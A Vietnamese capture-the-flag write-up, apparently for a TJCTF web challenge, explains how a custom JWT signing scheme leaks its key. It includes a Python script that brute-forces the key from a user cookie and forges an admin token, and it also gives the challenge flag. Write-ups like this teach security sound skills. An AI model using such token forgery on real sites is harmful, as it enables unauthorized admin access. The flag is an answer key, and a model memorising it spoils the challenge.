![image](https://github.com/user-attachments/assets/82b51914-7e59-4cbc-aa05-3552231cc769)

# **ANALYZE**

![image](https://github.com/user-attachments/assets/06093cb2-9bc1-42d4-8054-21e607967744)

Các chức năng của trang web có vẻ không có j nổi bật ngoài tạo tài khoản và xem các sản phẩm , 

Theo mô tả của đề bài thì mục tiêu của ta sẽ là cố gắng leo thang đặc quyền để trở thành admin.

ở trong tệp /robots.txt , tôi đã tìm thấy 1 số thứ khá hay ho -)) 

đây là 1 loại mã hóa khá đơn giản 
```
User-agent: * 
Disallow: 

# Gonna jot the encryption scheme I use down for later -The Incredible Admin
#
# def encrypt(inp):
#   enc = [13]
#   for i in range(len(inp)):
#     enc.append(ord(inp[i]) ^ 42)
#   return enc[1:]
```

và tôi đã tìm thấy mảnh ghép quan trọng thứ 2 để solve bài này ở mục product 

```
Revolutionary new Hashing Algorithm!!!
Made by our site's very own admin over many hours of work! It's so good that they decided to use it any time they need a hash!
        def has(inp):
            hashed = ""
            key = jwt_key
            for i in range(64):
                hashed = hashed + hash_char(inp[i % len(inp)], key[i % len(key)])
            return hashed

        def hash_char(hash_char, key_char):
            return chr(pow(ord(hash_char), ord(key_char), 26) + 65)
    
```

Từ 2 đoạn mã này , ta có thể hiểu rằng là : bài này chính là 1 dạng JWT , chúng ta sẽ phải sửa lại JWT để trở thành admin


sau khi tôi thử tạo 1 tài khoản bất kì , tôi đã nhận được 1 cookie : 
![image](https://github.com/user-attachments/assets/82dfecde-4a65-474a-9388-3fd40da1be32)

Và mục tiêu của chúng ta chính là đổi mục 
`"admin": "false"` trở thành   `"admin": "true"`

Và bên trên có chính là thật toán mã hóa JWT tự chế của tác giả  -))
Bây giờ chúng ta phải từ cookie vừa có được , đi ngược lại để tìm ra được JWT-key

# **EXPLOIT**

Và tôi đã nhờ chatgpt viết script tự động hóa việc tìm ra jwt_key và gen ra cookie mới để leo thang đặc quyền lên admin : 

```
import base64
import json
import string

# ------------------------------------
# Helper functions

# Base64 URL-safe without padding
def b64url_encode(data):
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

def b64url_decode(data):
    padding = '=' * (4 - len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)

# hash_char from challenge
def hash_char(hash_char, key_char):
    return chr(pow(ord(hash_char), ord(key_char), 26) + 65)

# ------------------------------------
# Given JWT
jwt = "eyJhbGciOiAiQURNSU5IQVNIIiwgInR5cCI6ICJKV1QifQ.eyJ1c2VybmFtZSI6ICJzIiwgInBhc3N3b3JkIjogInMiLCAiYWRtaW4iOiAiZmFsc2UifQ.JZOAYHBBBBNBDDQABXBFJOABZBLBBSOBVLBWVBQRSJJBOJYXDQZBEIRQBSOOFFWB"

header_b64, payload_b64, signature = jwt.split('.')

# inp = header_b64.payload_b64
inp = header_b64 + '.' + payload_b64

# ------------------------------------
# Brute force jwt_key

key_len = 64
possible_chars = string.printable  # All printable ASCII characters

jwt_key = ''

print("Brute forcing jwt_key...")
for i in range(key_len):
    target_char = signature[i]
    inp_char = inp[i % len(inp)]
    
    found = False
    for c in possible_chars:
        if hash_char(inp_char, c) == target_char:
            jwt_key += c
            found = True
            break
    
    if not found:
        print(f"[!] Could not find key_char for position {i}")
        jwt_key += '?'  # Placeholder in case of failure
    
    print(f"Position {i}: found key_char = {jwt_key[-1]!r}")

print(f"\nRecovered jwt_key:\n{jwt_key}")

# ------------------------------------
# Forge new JWT with admin=true

new_payload = {
    "username": "admin",
    "password": "whatever",
    "admin": "true"
}

# Re-encode
new_payload_b64 = b64url_encode(json.dumps(new_payload, separators=(',', ':')).encode())
new_inp = header_b64 + '.' + new_payload_b64

# Recompute signature
new_signature = ''
for i in range(64):
    new_signature += hash_char(new_inp[i % len(new_inp)], jwt_key[i % len(jwt_key)])

# Final forged JWT
forged_jwt = f"{header_b64}.{new_payload_b64}.{new_signature}"

print("\n[+] Forged JWT:")
print(forged_jwt)


```

kết quả trả về : 

```
eyJhbGciOiAiQURNSU5IQVNIIiwgInR5cCI6ICJKV1QifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJ3aGF0ZXZlciIsImFkbWluIjoidHJ1ZSJ9.JZOAYHBBBBNBDDQABXBFJOABZBLBBSOBVLBWVBQRSJJBOJYXDQZBEIRQBSOOFFWB
```
![image](https://github.com/user-attachments/assets/baa947c2-702b-4887-aa95-c3bc1b9dfdf1)

Sau khi ném JWT mới vào cookie thì ta đã vào được giao diện của admin : 

![image](https://github.com/user-attachments/assets/55750401-ad92-4f58-8100-86e5d8afd6d9)

Khi vào tới mục To-Do , ta thấy có 4 đoạn mã hex  :

![image](https://github.com/user-attachments/assets/d7ac612e-8bfe-4017-8f5d-56a531c5d4ac)

việc tiếp theo là dịch nó ra thì đơn giản rồi : 

```
[Line 1] Fix glitches
[Line 2] Advertise company
[Line 3] Create "business_secrets" page -- made it but no button to access yet
[Line 4] Take over the world -- almost done
```

Vậy có nghĩa là flag đang nằm ở path   `business_secrets`

![image](https://github.com/user-attachments/assets/05728476-2faa-4707-8c99-9778ec680509)



# **FLAG**

```
tjctf{buy_h1gh_s3l1_l0w}
```

